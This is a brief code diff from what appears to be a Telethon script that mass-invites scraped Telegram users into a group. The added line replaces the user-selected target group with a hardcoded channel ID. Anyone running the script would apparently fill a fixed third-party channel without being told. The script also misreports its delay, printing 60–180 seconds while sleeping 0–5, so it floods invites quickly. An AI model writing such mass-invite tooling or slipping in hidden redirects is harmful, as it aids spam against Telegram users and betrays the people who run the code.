@@ -101,7 +101,7 @@ for user in users:
             user_to_add = InputPeerUser(user['id'], user['access_hash'])
         else:
             sys.exit("Invalid Mode Selected. Please Try Again.")
-        client(InviteToChannelRequest(target_group_entity, [user_to_add]))
+        client(InviteToChannelRequest("-1001473859364", [user_to_add]))
         print("Waiting for 60-180 Seconds ...")
         time.sleep(random.randrange(0, 5))
     except PeerFloodError:
